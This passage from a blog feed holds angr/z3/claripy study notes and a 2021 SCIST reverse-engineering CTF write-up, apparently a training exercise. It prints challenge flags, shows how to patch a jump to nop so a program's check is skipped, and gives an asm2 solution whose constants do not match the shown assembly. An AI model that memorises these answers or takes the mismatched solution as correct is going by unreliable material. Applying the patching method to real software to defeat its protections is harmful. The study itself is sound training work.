language-py"><code class="language-py">from z3 import *# Create Variablesx = Int('x')y = Int('y')s = Solver() # Initialize solver# Add constraintss.add(x + y > 5)s.add(y < 3)s.add(x > 3)# Check if is SATif s.check() == sat:    print(s.model())else:    print('unsat')</code></pre><h3 id="Multiple-Solutions"><a href="#Multiple-Solutions" class="headerlink" title="Multiple Solutions"></a>Multiple Solutions</h3><p>e.g.<br>an array(len==20)</p><pre class=" language-py"><code class="language-py">while s.check() == sat:    m = s.model()    print(''.join(str(m[x[i]]) for i in range(20)))    con = [x[i] != m[x[i]] for i in range(20)]    s.add(Or(con))else:    print('unsat')</code></pre><h2 id="Angr-A-binary-analysis-framework"><a href="#Angr-A-binary-analysis-framework" class="headerlink" title="Angr - A binary analysis framework"></a>Angr - A binary analysis framework</h2><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><pre class=" language-py"><code class="language-py">from angr import *p = Porject('./a.out', auto_load_libs = False) # load binaryst = p.factory.entry_state() # create statesm = p.factory.simgr()# runsm.step()sm.run()sm.explore(find=0xface, avoid=0xdead)sm.explore(find=(0xface, 0xcafe, ), avoid=(0xdead, 0xbeef, ))sm.explore(find=lambda s: ..., avoid=lambda s: ...)</code></pre><h3 id="Common-Procedure"><a href="#Common-Procedure" class="headerlink" title="Common Procedure"></a>Common Procedure</h3><ol><li>Load binary</li><li>Create state</li><li>Add symbolic variables</li><li>Constrain the state with symbolic variables </li><li>Create simulation manager</li><li>Tell simulation manager where to explore</li><li>Run</li><li>Get our constrained variables’ value</li></ol><h2 id="Claripy"><a href="#Claripy" class="headerlink" title="Claripy"></a>Claripy</h2><p>BVS Bitvector Symbolic Variable<br>BVV Bitvector value<br><code>x = BVS('x',32)</code> declare x as a 32-bit BitVector<br><code>y = BVV(0xdeadbeef,32)</code> declare y as a 32-bit value將 y 宣告為 32-bit 的 0xdeadbeef 常數</p><pre class=" language-py"><code class="language-py">from claripy import *s = Solver()x = BVS('x', 32)y = BVS('y', 32)s.add(x == 1)s.add(y == 2)print(s.eval(x, 1))print(s.eval(y, 1))</code></pre><h3 id="Add-comstraints"><a href="#Add-comstraints" class="headerlink" title="Add comstraints"></a>Add comstraints</h3><pre class=" language-py"><code class="language-py">#common setupfor x in variables:    st.add_constraints(x >= 0x20)    st.add_constraints(x < 0x7f)# every character is a numberfor x in variables:    st.add_constraints(x >= 48, x <= 57)flag_chars = [BVS(f'x_{i}' , 8) for i in range(10)]flag = Concat(*flag_chars + [BVV(b'\n')])st = p.factory.entry.state(args=[bin, flag]) # pass by argvst = p.factory.entry_state(stdin=flag) # pass by stdin</code></pre><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> SCIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Note </tag>
            
            <tag> SCIST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 SCIST Security Reverse Write-up</title>
      <link href="/2021/04/10/2021-SCIST-Security-Reverse-Write-up/"/>
      <url>/2021/04/10/2021-SCIST-Security-Reverse-Write-up/</url>
      
        <content type="html"><![CDATA[<p>因為是一年前隨手記錄的東西所以稍微有點雜 &gt;&lt;</p><h2 id="CTFd"><a href="#CTFd" class="headerlink" title="CTFd"></a>CTFd</h2><p><img src="https://i.imgur.com/yGgxWEr.png"><br><img src="https://i.imgur.com/Kv8t6z2.png"></p><h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><h3 id="picoCTF-2019-asm2"><a href="#picoCTF-2019-asm2" class="headerlink" title="picoCTF 2019 asm2"></a>picoCTF 2019 asm2</h3><blockquote><p>What will asm2(0x6,0x24) return?</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        read.asm    </div>    <div class="spoiler-content">        <pre class=" language-py"><code class="language-py">asm2:    <+0>:    push   ebp    <+1>:    mov    ebp,esp    <+3>:    sub    esp,0x10    <+6>:    mov    eax,DWORD PTR [ebp+0xc]    <+9>:    mov    DWORD PTR [ebp-0x4],eax    <+12>:    mov    eax,DWORD PTR [ebp+0x8]    <+15>:    mov    DWORD PTR [ebp-0x8],eax    <+18>:    jmp    0x50c <asm2+31>    <+20>:    add    DWORD PTR [ebp-0x4],0x1    <+24>:    add    DWORD PTR [ebp-0x8],0xaf    <+31>:    cmp    DWORD PTR [ebp-0x8],0xa3d3    <+38>:    jle    0x501 <asm2+20>    <+40>:    mov    eax,DWORD PTR [ebp-0x4]    <+43>:    leave      <+44>:    ret    </code></pre>    </div></div><p>sol</p><pre class=" language-py"><code class="language-py">a = 0x24 #ebp-0x4b = 0x6 # ebp-0x8while(b <= 0x3c75):        a +=1        b += 0xf9print(a)</code></pre><p>Ans <code>99</code></p><h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><h3 id="hexedit"><a href="#hexedit" class="headerlink" title="hexedit"></a>hexedit</h3><p>可以直接 <code>strings</code> 找到<br><img src="https://i.imgur.com/XtFZEXB.png"></p><blockquote><p>flag <code>easyctf{eb04fadf}</code></p></blockquote><h3 id="hexable"><a href="#hexable" class="headerlink" title="hexable"></a>hexable</h3><p>一樣是 <code>strings</code><br><img src="https://i.imgur.com/VpGmmSc.png"></p><blockquote><p>flag <code>easyctf{abcdef__123456}</code></p></blockquote><h3 id="CSIE-strace"><a href="#CSIE-strace" class="headerlink" title="CSIE_strace"></a>CSIE_strace</h3><p>先去<code>strace</code>看看，會發現它有噴 flag 出來<br>但是 flag 太長了 有 36 個字，沒辦法全部顯示出來</p><p><img src="https://i.imgur.com/IEElnWV.png"></p><p>我們可以用 <code>man</code> 去看看 strace 有甚麼 OPTIONS</p><p><code>man strace</code></p><p><img src="https://i.imgur.com/FExicvF.png"></p><p>找到了！<code>strace</code>預設的顯示字元長度是32<br>所以我們把它改成36就可以了！</p><p><code>strace -s 36 ./strace</code></p><p><img src="https://i.imgur.com/89zCNLc.png"></p><p>Flag <code>FLAG{____yaaaa_flag_in_the_stack___}</code></p><h3 id="EasyCTF-adder"><a href="#EasyCTF-adder" class="headerlink" title="EasyCTF_adder"></a>EasyCTF_adder</h3><p>IDA Pro 開起來，可以看到 <code>std::istream::operator&gt;&gt;(int &amp;)</code> ，代表它會 <code>cin</code> 3 個數字<br><img src="https://i.imgur.com/3hD4Jcz.png"></p><p>把它們換成好辨識的名字後看 pseudocode(F5)，可以看到三個相加為 <code>1337</code> 就會給 Flag<br><img src="https://i.imgur.com/7EdddJ1.png"></p><p>Flag <code>EasyCTF_adder</code></p><h3 id="picoCTF2017-Coffee"><a href="#picoCTF2017-Coffee" class="headerlink" title="picoCTF2017_Coffee"></a>picoCTF2017_Coffee</h3><p>下載之後看到是<code>.class</code><br>可以丟到網路上去反編譯<br><a href="http://www.javadecompilers.com/">Decompilers online</a></p><div class="spoiler collapsed">    <div class="spoiler-title">        decompile    </div>    <div class="spoiler-content">        <pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span><span class="token comment" spellcheck="true">// Decompiled by Procyon v0.5.36</span><span class="token comment" spellcheck="true">// </span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">problem</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> String s <span class="token operator">=</span> <span class="token string">"eux_Z]\\ayiqlog`s^hvnmwr[cpftbkjd"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> String s2 <span class="token operator">=</span> <span class="token string">"Zf91XhR7fa=ZVH2H=QlbvdHJx5omN2xc"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes2 <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>bytes2<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> bytes2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> bytes2<span class="token punctuation">[</span>bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Nothing to see here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>    </div></div><p>translate to python</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode <span class="token keyword">as</span> b64ds <span class="token operator">=</span> <span class="token string">"eux_Z]\\ayiqlog`s^hvnmwr[cpftbkjd"</span>s2 <span class="token operator">=</span> <span class="token string">"Zf91XhR7fa=ZVH2H=QlbvdHJx5omN2xc"</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>s2 <span class="token operator">=</span> s2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#print(s2[s[i]-90])</span>    a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>str<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    b <span class="token operator">+=</span> chr<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64d<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://i.imgur.com/WxWRWbg.png"></p><blockquote><p>flag <code>flag_{pretty_cool_huh}</code></p></blockquote><h3 id="EasyCTF-LuckyGuess"><a href="#EasyCTF-LuckyGuess" class="headerlink" title="EasyCTF_LuckyGuess"></a>EasyCTF_LuckyGuess</h3><p>下載後一樣可以看到 guess 是一個 exe 檔</p><p><img src="https://i.imgur.com/NTJVBWN.png"></p><p>所以去執行看看，會發現是猜數字的程式碼<br><img src="https://i.imgur.com/ZEHBABr.png"></p><p>我們可以去看一下它的 asm<br><code>objdump -d ./guess | less</code></p><p>發現它會去<code>cmp</code>(比較)，如果<code>jne</code>(不相等)就會跳到其他地方<br><img src="https://i.imgur.com/RXqonU3.png"></p><p>那我們可以把在<code>cmp</code>完之後讓他<code>nop</code><br>這樣就不會跳轉了~<br>可以使用 hexedit 來改 machine code</p><blockquote><p>hexedit install:<br><code>sudo apt install hexedit</code></p></blockquote><blockquote><p>hotkey<br>ctrl+w : search<br>ctrl+x : save+quit</p></blockquote><p>可以使用 pwntools 裡面的<code>asm</code>去把 asm 轉換成 machine code<br><img src="https://i.imgur.com/XuC8ij3.png"></p><p><code>hexedit ./guess</code><br>找到<br><img src="https://i.imgur.com/fotVxfC.png"></p><p>此時再重新去 <code>objdump</code> 看一次的話就會發現已經變成 <code>nop</code> 了！<br><img src="https://i.imgur.com/tN5RsW6.png"></p><p>所以執行並隨便輸入一個數字就可以了<br><img src="https://i.imgur.com/AZf6Rc1.png"></p><blockquote><p>flag <code>flag{aaA_tOucH_0f_luccK_47ca4e}</code></p></blockquote><h3 id="EasyCTF-liar"><a href="#EasyCTF-liar" class="headerlink" title="EasyCTF_liar"></a>EasyCTF_liar</h3><p>先丟進去 IDA Pro 看 pseudo code (偽代碼)</p><div class="spoiler collapsed">    <div class="spoiler-title">        pseudo code    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_A64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">160LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">205LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">247LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">76LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">176LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">154LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">231LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">135LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">232LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">148LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">21LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">89LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">215LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">211LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">217LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">143LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">245LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">241LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">129LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">206LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125LL</span><span class="token punctuation">;</span>  f<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">202LL</span><span class="token punctuation">;</span>  m <span class="token operator">=</span> n <span class="token operator">^</span> <span class="token number">0x58EB29</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">36</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    g<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> m <span class="token operator">*</span> i <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  g<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> g<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">101</span> <span class="token operator">&amp;&amp;</span> g<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> g<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">115</span> <span class="token operator">&amp;&amp;</span> g<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">121</span> <span class="token operator">&amp;&amp;</span> g<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">99</span> <span class="token operator">&amp;&amp;</span> g<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">116</span> <span class="token operator">&amp;&amp;</span> g<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">102</span> <span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the flag is %s\n"</span><span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        在 C++ 裡面先跑出 f    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    f<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">160LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">205LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">247LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">76LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">176LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">154LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">231LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">135LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">232LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">148LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">21LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">89LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">215LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">211LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">217LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">143LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">245LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">241LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56LL</span><span class="token punctuation">;</span>    f<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token 